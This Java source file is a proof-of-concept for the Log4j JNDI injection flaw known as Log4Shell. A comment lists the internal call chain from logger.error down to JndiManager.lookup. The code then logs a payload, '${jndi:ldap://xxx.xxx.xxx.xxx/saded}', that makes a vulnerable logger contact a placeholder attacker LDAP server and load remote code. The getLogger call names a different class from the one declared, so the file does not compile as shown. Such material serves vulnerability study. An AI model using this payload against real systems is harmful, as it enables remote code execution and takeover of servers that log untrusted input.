import org.apache.logging.log4j.*;
import org.apache.logging.log4j.spi.AbstractLogger;
import org.apache.logging.log4j.core.pattern.PatternFormatter;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;

public class log4j_RCE {
    private static final Logger logger = LogManager.getLogger(log4j_dataOutboundByDNSLOG.class);

    public static void main(String[] args) {

        /*
        * 调用链
        *   lookup:172, JndiManager (org.apache.logging.log4j.core.net)
            lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup)
            lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
            resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
            substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
            substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
            replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
            format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
            format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
            toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)
            toText:244, PatternLayout (org.apache.logging.log4j.core.layout)
            encode:229, PatternLayout (org.apache.logging.log4j.core.layout)
            encode:59, PatternLayout (org.apache.logging.log4j.core.layout)
            directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
            tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
            append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)
            tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)
            callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)
            callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)
            callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)
            callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config)
            processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config)
            log:481, LoggerConfig (org.apache.logging.log4j.core.config)
            log:456, LoggerConfig (org.apache.logging.log4j.core.config)
            log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config)
            log:161, Logger (org.apache.logging.log4j.core)
            tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi)
            logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi)
            logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi)
            logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi)
            logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)
            error:740, AbstractLogger (org.apache.logging.log4j.spi)
            main:8, main
        *
        * */
        String payload = "${jndi:ldap://xxx.xxx.xxx.xxx/saded}";
        System.out.println(payload);
        logger.error(payload);
    }
}
